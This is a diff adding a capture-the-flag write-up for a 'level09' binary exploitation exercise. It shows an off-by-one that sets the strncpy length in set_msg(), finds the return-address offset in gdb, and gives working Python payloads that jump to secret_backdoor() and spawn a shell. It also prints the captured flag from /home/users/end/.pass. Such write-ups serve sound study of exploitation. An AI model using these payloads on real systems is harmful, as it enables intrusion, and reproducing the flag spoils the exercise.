@@ -1,0 +1,69 @@
+This program asks for a username, then prints it and asks for a message, then prints "Msg sent !"
+
+Disassembling the binary I see a function handle_msg() that calls set_username() and set_msg().
+
+There is an uncalled function nammed secret_backdoor(), that calls system on an input got by fgets().
+
+The goal of the exploitation is to execute secret_backdoor().
+
+
+In set_username(), the buffer is copied in a loop opf 41 iterations, but the buffer size is actually 40, so it is possible to write on that last byte.
+
+Then, on set_msg(), the buffer is copied using strncpy. The n parameter of strncpy is the buffer's len.
+
+As we overflow the buffer by 1 byte in set_username(), we can set the value of buffer_len and so overflow with set_msg.
+
+After we overflow and find secret_backdoor()'s address and RIP offset, we can write the address at the offset and we should be able to run secret_backdoor().
+
+RIP offset:
+
+$ chmod 777 .
+$ touch out
+$ chmod 777 out
+$  (python -c 'print "A" * 40 + "\xee"'; python -c 'print "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"') > out
+$ gdb level09
+
+(gdb) r < out
+Starting program: /home/users/level09/level09 < out
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+(gdb) info register
+rax            0xd	13
+rbx            0x0	0
+rcx            0x7ffff7b01f90	140737348902800
+rdx            0x7ffff7dd5a90	140737351867024
+rsi            0x7ffff7ff7000	140737354100736
+rdi            0xffffffff	4294967295
+rbp            0x6161616161616179	0x6161616161616179
+rsp            0x7fffffffe588	0x7fffffffe588
+r8             0x7ffff7ff7004	140737354100740
+...
+
+RBP = 0x6161616161616179 == "aaaaaaay" => offset = 192 + 8 = 200
+
+secret_backdoor()'s address:
+
+(gdb) p &secret_backdoor
+$1 = (<text variable, no debug info> *) 0x55555555488c <secret_backdoor>
+
+Let's try it out:
+
+$ (python -c 'print "A" * 40 + "\xee"' ; python -c 'print "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' ; cat ) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+/bin/sh
+whoami
+end
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
